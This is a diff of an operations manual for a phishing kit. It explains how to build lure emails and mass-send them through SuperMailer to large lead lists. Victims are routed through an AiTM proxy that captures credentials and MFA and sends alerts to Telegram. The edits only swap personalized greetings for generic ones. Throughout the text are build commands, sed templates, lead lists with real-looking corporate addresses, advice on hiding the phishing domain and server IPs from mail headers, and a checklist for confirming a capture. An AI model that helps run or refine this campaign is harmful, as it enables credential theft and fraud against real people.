@@ -6,18 +6,20 @@
 
 ## 1. Overview
 
-Supermailer (Professional Unlimited BCC license) is the email delivery engine for the GLNT Phish Kit. It sends HTML lure emails to target lists with per-recipient personalization via BCC mode, tracks opens/clicks/bounces, and handles throttling.
+Supermailer (Professional Unlimited BCC license) is the email delivery engine for the GLNT Phish Kit. It sends HTML lure emails to target lists via BCC mode (identical content to all recipients with generic greeting defaults), tracks opens/clicks/bounces, and handles throttling.
 
 **Pipeline position:**
 ```
 Lead CSV (glnt-data/leads/*.csv)
-  → build-campaign-email.sh (fills {LINK} + {RECIPIENT_NAME} into template)
-  → SuperMailer (SMTP send with throttling, BCC, tracking)
+  → build-campaign-email.sh (fills {LINK} into template; {RECIPIENT_NAME} defaults to "Colleague" for BCC)
+  → SuperMailer (SMTP send with throttling, BCC, tracking — identical content to all recipients)
   → Recipient inbox → clicks link → glnt.cc → AiTM proxy → credentials captured
   → Telegram alert + analytics dashboard
 ```
 
 **Key paths:** `scripts/build-campaign-email.sh` (link insertion), `lures/*.html` (10 body lures with `{LINK}`/`{RECIPIENT_NAME}`), `lures/attachments/*.html` (10 attachment lures with `{LINK}`/`##victimemail##`/`{SENDER_ORG}`), `~/glnt-data/leads/` (113K+ verified CSVs), `CURRENT_LINK.txt` (active phishing URL).
+
+**Note:** BCC mode sends identical content to all recipients. Body lures use a generic greeting (default: "Colleague"). `{RECIPIENT_NAME}` is substituted at build time with a generic value -- per-recipient name substitution is not possible in BCC mode.
 
 ---
 
@@ -96,18 +98,17 @@ cd /Users/sk_hga/azure-phish-kit
 ./scripts/build-campaign-email.sh \
   shared-document \
   "https://glnt.cc/#<encrypted-fragment>" \
-  "{FirstName}" \
   /tmp/campaign-email.html
 ```
 
 **Arguments:**
 
-| Arg | Description | Example |
-|-----|-------------|---------|
-| `$1` | Lure template name (without `.html`) | `shared-document` |
-| `$2` | Full phishing URL with encrypted fragment | `https://glnt.cc/#abc123...` |
-| `$3` | SuperMailer merge field for recipient name | `{FirstName}` |
-| `$4` | Output file path | `/tmp/campaign-email.html` |
+| Arg | Description | Required | Example |
+|-----|-------------|----------|---------|
+| `$1` | Lure template name (without `.html`) | Yes | `shared-document` |
+| `$2` | Full phishing URL with encrypted fragment | Yes | `https://glnt.cc/#abc123...` |
+| `$3` | Greeting name for the email (defaults to "Colleague") | No | `Colleague` |
+| `$4` | Output file path | No (defaults to `campaign-email.html`) | `/tmp/campaign-email.html` |
 
 ### 3.2 How Placeholders Work
 
@@ -118,10 +119,10 @@ sed "s|{LINK}|${LINK}|g; s|{RECIPIENT_NAME}|${NAME}|g" "$LURE_FILE" > "$OUTPUT"
 
 ```
 {LINK}              →  phishing URL (e.g., https://glnt.cc/#...)
-{RECIPIENT_NAME}    →  SuperMailer merge field (e.g., {FirstName})
+{RECIPIENT_NAME}    →  generic greeting (defaults to "Colleague")
 ```
 
-**Critical detail:** The greeting is `Hello{RECIPIENT_NAME},` (no space). SuperMailer substitutes `{FirstName}` → "Dirk" yielding "HelloDirk,". The template omits the space intentionally so it doesn't appear before the comma. To add a space, edit the lure to `Hello {RECIPIENT_NAME},` before building.
+**Critical detail:** In BCC mode, the greeting is the same for all recipients. The script defaults `--name` to "Colleague" when omitted, producing greetings like "Hello Colleague,". This is a limitation of BCC mass-send -- identical content goes to every recipient. Per-recipient name personalization is not possible in this mode.
 
 ### 3.3 Paste into SuperMailer
 
@@ -146,7 +147,7 @@ The sender domain **must not** be your phishing domain (e.g., `glnt.cc`). Use a 
 
 ### 3.5 BCC Mode
 
-SuperMailer's BCC mode sends each email individually. `{FirstName}` is substituted with the actual name from your lead list. The recipient sees "Hello Dirk," not "Hello Colleague,". Personalization increases open rates 30-50%.
+SuperMailer's BCC mode sends the identical email content to every recipient. The `{RECIPIENT_NAME}` placeholder is substituted at build time with a generic value (defaults to "Colleague"). All recipients see the same greeting, e.g., "Hello Colleague,".
 
 Do NOT use `##victimemail##` in body lures — that placeholder is only for attachment lures (Section 4).
 
@@ -179,25 +180,25 @@ Attachment lures use three placeholders:
 
 ```
 {LINK}              →  phishing URL (same as body lures)
-##victimemail##     →  recipient's email address, displayed in the attachment body
+##victimemail##     →  generic email reference (e.g., "your email address") -- in BCC mode this cannot be per-recipient
 {SENDER_ORG}        →  sender's organization name (e.g., "Fidelity Investments")
 ```
 
-Example from DocuSign: "Sign-in authentication with **dirk.allison@addus.com** is required to access the document." The `##victimemail##` placeholder makes the attachment feel authentic by already "knowing" the recipient's email.
+**Note:** In BCC mode, the same attachment content is delivered to all recipients. The `##victimemail##` placeholder should be replaced with a generic phrase like "your email address" or "your account" since per-recipient personalization is not possible.
 
 ### 4.3 Building an Attachment Lure
 
-`build-campaign-email.sh` only handles `{LINK}` and `{RECIPIENT_NAME}`. For attachment lures, use manual sed:
+`build-campaign-email.sh` only handles `{LINK}` and `{RECIPIENT_NAME}`. For attachment lures, use manual sed with generic placeholders (BCC mode cannot use per-recipient merge fields):
 
 ```bash
 LINK="https://glnt.cc/#<encrypted-fragment>"
-sed "s|{LINK}|${LINK}|g; s|##victimemail##|{Email}|g; s|{SENDER_ORG}|{Company}|g" \
+sed "s|{LINK}|${LINK}|g; s|##victimemail##|your email address|g; s|{SENDER_ORG}|your organization|g" \
   lures/attachments/docusign-wire.html > /tmp/docusign-attachment.html
 ```
 
 This maps:
-- `##victimemail##` → `{Email}` (SuperMailer merge field)
-- `{SENDER_ORG}` → `{Company}` (SuperMailer merge field from lead CSV `company` column)
+- `##victimemail##` → generic phrase (e.g., "your email address") -- BCC limitation
+- `{SENDER_ORG}` → generic phrase (e.g., "your organization") -- BCC limitation
 
 ### 4.4 Sending in SuperMailer
 
@@ -235,7 +236,7 @@ abigail.johnson@fidelity.com,Abigail,Johnson,fidelity.com,first.last,Executive,F
 | CSV Column | SuperMailer Field | Purpose |
 |------------|-------------------|---------|
 | `email` | `{Email}` | Recipient address — required |
-| `first` | `{FirstName}` | First name for greeting personalization |
+| `first` | `{FirstName}` | First name (informational only in BCC mode -- greeting is generic) |
 | `last` | `{LastName}` | Last name (optional) |
 | `company` | `{Company}` | Organization name for `{SENDER_ORG}` in attachment lures |
 
@@ -336,7 +337,7 @@ Investigate >5% bounces: re-verify lead list, check SPF/DKIM/DMARC, check if spe
 4. **Verify link end-to-end:** click → bootloader loads → reaches real login → complete MFA → Telegram notification
 5. **Check raw headers** (Gmail: three dots → Show Original): no phishing domain in any header, no EC2 IP in `Received:` chain, `Return-Path` points to bounce address
 
-**Go/No-Go checklist:** mail-tester 9+/10, link resolves to real login, Telegram capture confirmed, headers clean (no phishing domain/IP leaks), renders in Gmail/Outlook/mobile, BCC personalization correct. Fix any failed check and re-test. Never skip this step.
+**Go/No-Go checklist:** mail-tester 9+/10, link resolves to real login, Telegram capture confirmed, headers clean (no phishing domain/IP leaks), renders in Gmail/Outlook/mobile, generic greeting renders correctly. Fix any failed check and re-test. Never skip this step.
 
 ---
 
@@ -487,8 +488,8 @@ Outlook uses Word's HTML engine. Common fixes:
 
 | Symptom | Cause | Fix |
 |---------|-------|-----|
-| `{RECIPIENT_NAME}` appears literally | sed substitution failed | Re-run `build-campaign-email.sh` |
-| `##victimemail##` appears in attachment | Placeholder not replaced | Use manual sed per Section 4.3 |
+| `{RECIPIENT_NAME}` appears literally | sed substitution failed — name arg missing or blank | Re-run `build-campaign-email.sh` (defaults to "Colleague" if omitted) |
+| `##victimemail##` appears in attachment | Placeholder not replaced — use generic phrase | Use manual sed per Section 4.3 (replace with generic text like "your email address") |
 | Missing button in preview | `{LINK}` not replaced | Verify link was passed as `$2` |
 
 ### 9.6 Quick Diagnostic Commands
